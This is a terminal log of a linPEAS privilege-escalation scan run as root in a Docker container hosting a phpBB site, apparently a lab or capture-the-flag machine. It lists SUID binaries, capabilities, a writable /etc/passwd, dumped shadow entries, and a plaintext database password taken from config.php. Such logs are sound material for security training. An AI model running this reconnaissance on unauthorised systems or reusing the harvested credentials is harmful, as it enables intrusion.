/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/CFCA_EV_ROOT.pem
/etc/ssl/certs/COMODO_Certification_Authority.pem
/etc/ssl/certs/COMODO_ECC_Certification_Authority.pem
608PSTORAGE_CERTSBIN


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 1 root root 4096 Apr  9  2021 /etc/pam.d




╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 18  2021 /usr/share/keyrings




╔══════════╣ Analyzing Backup Manager Files (limit 70)

-rw-rw-r-- 1 daemon root 10862 Jan 29  2021 /opt/bitnami/phpbb/phpbb/install/helper/database.php

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing Github Files (limit 70)
drwxrwxr-x 1 daemon root 4096 Jan 29  2021 /opt/bitnami/phpbb/vendor/google/recaptcha/.github
drwxrwxr-x 1 daemon root 4096 Jan 29  2021 /opt/bitnami/phpbb/vendor/patchwork/utf8/.github




╔══════════╣ Analyzing PGP-GPG Files (limit 70)
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 8132 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 5106 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root 5115 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root 2763 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 7443 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 8132 Apr 23  2019 /usr/share/keyrings/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Apr 23  2019 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Apr 23  2019 /usr/share/keyrings/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 5106 Apr 23  2019 /usr/share/keyrings/debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root 5115 Apr 23  2019 /usr/share/keyrings/debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root 2763 Apr 23  2019 /usr/share/keyrings/debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 48747 Apr 23  2019 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 23889 Apr 23  2019 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 7443 Apr 23  2019 /usr/share/keyrings/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Apr 23  2019 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Apr 23  2019 /usr/share/keyrings/debian-archive-stretch-stable.gpg


╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
-rw-rw-r-- 1 daemon root 387 Jan 29  2021 /opt/bitnami/phpbb/vendor/guzzlehttp/guzzle/Dockerfile


╔══════════╣ Analyzing Windows Files (limit 70)















































-rw-rw-r-- 1 daemon root 1177 Jan 29  2021 /opt/bitnami/phpbb/web.config




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 570 Jan 31  2010 /root/.bashrc





-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 root root 148 Aug 17  2015 /root/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 35K Jan 10  2019 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 51K Jan 10  2019 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jan 10  2019 /bin/su
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry
-rwxr-sr-x 1 root tty 35K Jan 10  2019 /usr/bin/wall
-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /sbin/unix_chkpwd

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
══╣ Current shell capabilities
CapInh:  0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
CapPrm:  0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
CapEff:	 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
CapBnd:  0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:	 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
CapPrm:	 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
CapEff:	 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
CapBnd:	 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
CapAmb:	 0x0000000000000000=


Files with capabilities (limited to 50):
/bin/ping = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. root:*:17885:0:99999:7:::
daemon:*:17885:0:99999:7:::
bin:*:17885:0:99999:7:::
sys:*:17885:0:99999:7:::
sync:*:17885:0:99999:7:::
games:*:17885:0:99999:7:::
man:*:17885:0:99999:7:::
lp:*:17885:0:99999:7:::
mail:*:17885:0:99999:7:::
news:*:17885:0:99999:7:::
uucp:*:17885:0:99999:7:::
proxy:*:17885:0:99999:7:::
www-data:*:17885:0:99999:7:::
backup:*:17885:0:99999:7:::
list:*:17885:0:99999:7:::
irc:*:17885:0:99999:7:::
gnats:*:17885:0:99999:7:::
nobody:*:17885:0:99999:7:::
_apt:*:17885:0:99999:7:::
root:*:17885:0:99999:7:::
daemon:*:17885:0:99999:7:::
bin:*:17885:0:99999:7:::
sys:*:17885:0:99999:7:::
sync:*:17885:0:99999:7:::
games:*:17885:0:99999:7:::
man:*:17885:0:99999:7:::
lp:*:17885:0:99999:7:::
mail:*:17885:0:99999:7:::
news:*:17885:0:99999:7:::
uucp:*:17885:0:99999:7:::
proxy:*:17885:0:99999:7:::
www-data:*:17885:0:99999:7:::
backup:*:17885:0:99999:7:::
list:*:17885:0:99999:7:::
irc:*:17885:0:99999:7:::
gnats:*:17885:0:99999:7:::
nobody:*:17885:0:99999:7:::
_apt:*:17885:0:99999:7:::
root:*::
daemon:*::
bin:*::
sys:*::
adm:*::
tty:*::
disk:*::
lp:*::
mail:*::
news:*::
uucp:*::
man:*::
proxy:*::
kmem:*::
dialout:*::
fax:*::
voice:*::
cdrom:*::
floppy:*::
tape:*::
sudo:*::
audio:*::
dip:*::
www-data:*::
backup:*::
operator:*::
list:*::
irc:*::
src:*::
gnats:*::
shadow:*::
utmp:*::
video:*::
sasl:*::
plugdev:*::
staff:*::
games:*::
users:*::
nogroup:*::
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. ═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. total 108
drwx------ 1 root root  4096 Aug 19 10:31 .
drwxr-xr-x 1 root root  4096 Aug 19 10:26 ..
-rw-r--r-- 1 root root   570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root  4096 Mar 25  2021 .local
-rw-r--r-- 1 root root   148 Aug 17  2015 .profile
-rw-r--r-- 1 root root    41 Mar 25  2021 flag.txt
-rw-r--r-- 1 root root 83554 Aug 19 10:33 lin.out

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/root/
/root/.bashrc
/root/.profile
/root/flag.txt
/root/lin.out
/root/.local
/root/.local/share
/root/.local/share/nano



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path

╔══════════╣ Executable files potentially added by user (limit 70)
2021-03-25+16:08:19.2231587980 /.dockerenv

╔══════════╣ Unexpected in /opt (usually empty)
total 24
drwxrwxr-x 1 root root 4096 Mar 25  2021 .
drwxr-xr-x 1 root root 4096 Aug 19 10:26 ..
drwxrwxr-x 1 root root 4096 Mar 24  2021 bitnami
drwxr-xr-x 2 root root 4096 May  1  2021 clean

╔══════════╣ Unexpected in root
/test
/.bash_history
/.dockerenv
/bitnami
/post-init.d
/post-init.sh

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/root/lin.out


╔══════════╣ Files inside / (limit 20)
total 116
drwxr-xr-x   1 root root 4096 Aug 19 10:26 .
drwxr-xr-x   1 root root 4096 Aug 19 10:26 ..
-rw-------   1 root root  588 Jun  4  2021 .bash_history
-rwxr-xr-x   1 root root    0 Mar 25  2021 .dockerenv
drwxr-xr-x   1 root root 4096 Apr  9  2021 bin
drwxr-xr-x   3 root root 4096 Mar 24  2021 bitnami
drwxr-xr-x   2 root root 4096 Jan 30  2021 boot
drwxr-xr-x   5 root root  340 Aug 19 09:03 dev
drwxr-xr-x   1 root root 4096 Apr  9  2021 etc
drwxr-xr-x   2 root root 4096 Jan 30  2021 home
drwxr-xr-x   1 root root 4096 Sep 25  2017 lib
drwxr-xr-x   2 root root 4096 Feb 18  2021 lib64
drwxr-xr-x   2 root root 4096 Feb 18  2021 media
drwxr-xr-x   2 root root 4096 Feb 18  2021 mnt
drwxrwxr-x   1 root root 4096 Mar 25  2021 opt
drwxrwxr-x   2 root root 4096 Mar 24  2021 post-init.d
-rwxrwxr-x   1 root root  796 Mar 24  2021 post-init.sh
dr-xr-xr-x 143 root root    0 Aug 19 09:03 proc
drwx------   1 root root 4096 Aug 19 10:31 root
drwxr-xr-x   4 root root 4096 Feb 18  2021 run
drwxr-xr-x   1 root root 4096 Apr  9  2021 sbin
drwxr-xr-x   2 root root 4096 Feb 18  2021 srv

╔══════════╣ Files inside others home (limit 20)

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)


╔══════════╣ Web files?(output limit)

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Feb 18  2021 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 1543 Mar 24  2021 /opt/bitnami/.bitnami_components.json
-rw-rw-r-- 1 daemon root 0 Jan 29  2021 /opt/bitnami/phpbb/.buildcomplete
-rw-rw-r-- 1 daemon root 153 Mar 24  2021 /opt/bitnami/phpbb/includes/.htaccess
-rw-rw-r-- 1 daemon root 153 Mar 24  2021 /opt/bitnami/phpbb/.htaccess
-rw-rw-r-- 1 daemon root 153 Mar 24  2021 /opt/bitnami/phpbb/config/.htaccess
-rw-rw-r-- 1 daemon root 153 Mar 24  2021 /opt/bitnami/phpbb/cache/.htaccess
-rw-rw-r-- 1 daemon root 799 Jan 29  2021 /opt/bitnami/phpbb/vendor/twig/twig/.php_cs.dist
-rw-rw-r-- 1 daemon root 645 Jan 29  2021 /opt/bitnami/phpbb/vendor/guzzlehttp/guzzle/.php_cs
-rw-rw-r-- 1 daemon root 3701 Jan 29  2021 /opt/bitnami/phpbb/vendor/guzzlehttp/promises/.php_cs.dist
-rw-r--r-- 1 root root 6961 Mar 17  2021 /opt/bitnami/php/lib/php/.filemap
-rw-r--r-- 1 root root 0 Mar 17  2021 /opt/bitnami/php/lib/php/.lock
-rw-r--r-- 1 root root 0 Nov 13  2020 /opt/bitnami/common/bin/.buildcomplete
-rw-rw-r-- 1 1001 root 153 Mar 24  2021 /bitnami/phpbb/store/.htaccess
-rw-rw-r-- 1 1001 root 153 Mar 24  2021 /bitnami/phpbb/images/avatars/upload/.htaccess
-rw-rw-r-- 1 1001 root 153 Mar 24  2021 /bitnami/phpbb/files/.htaccess

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)

╔══════════╣ Searching passwords in config PHP files
/opt/bitnami/phpbb/config.php:$dbpasswd = 'P@ssword';
/opt/bitnami/phpbb/config.php:$dbuser = 'bn_phpbb';
/opt/bitnami/phpbb/phpbb/auth/provider/db.php:					SET user_password = '" . $this->db->sql_escape($hash) . "'
/opt/bitnami/phpbb/phpbb/auth/provider/db.php:				$row['user_password'] = $hash;
/opt/bitnami/phpbb/phpbb/auth/provider/db.php:			if ($this->passwords_manager->convert_flag || strlen($row['user_password']) == 32)
/opt/bitnami/phpbb/phpbb/auth/provider/db.php:		$password = trim($password);
/opt/bitnami/phpbb/phpbb/auth/provider/db.php:		$this->passwords_manager = $passwords_manager;
/opt/bitnami/phpbb/phpbb/install/module/install_filesystem/task/create_config_file.php:			'dbpasswd'	=> $this->install_config->get('dbpasswd'),
/opt/bitnami/phpbb/phpbb/install/module/install_filesystem/task/create_config_file.php:			'dbuser'	=> $this->install_config->get('dbuser'),

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password
/opt/bitnami/apache/conf/bitnami/certs/server.key
/opt/bitnami/apache/manual/misc/password_encryptions.html
/opt/bitnami/apache/manual/misc/password_encryptions.html.en
/opt/bitnami/apache/manual/misc/password_encryptions.html.fr.utf8
/opt/bitnami/mysql/plugin/caching_sha2_password.so
/opt/bitnami/mysql/plugin/mysql_clear_password.so
/opt/bitnami/mysql/plugin/sha256_password.so
/opt/bitnami/mysql/plugin/simple_password_check.so
  #)There are more creds/passwds files in the previous parent folder

/opt/bitnami/phpbb/config/default/container/services_password.yml
/opt/bitnami/phpbb/phpbb/db/migration/data/v310/forgot_password.php
/opt/bitnami/phpbb/phpbb/db/migration/data/v310/passwords.php
/opt/bitnami/phpbb/phpbb/db/migration/data/v310/passwords_convert_p1.php
/opt/bitnami/phpbb/phpbb/db/migration/data/v310/passwords_convert_p2.php
  #)There are more creds/passwds files in the previous parent folder

/opt/bitnami/phpbb/phpbb/passwords
/opt/bitnami/phpbb/phpbb/passwords/driver/convert_password.php
/opt/bitnami/phpbb/phpbb/ucp/controller/reset_password.php
/usr/share/pam/common-password
/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 


root@7546fa2336d6:/root# 


```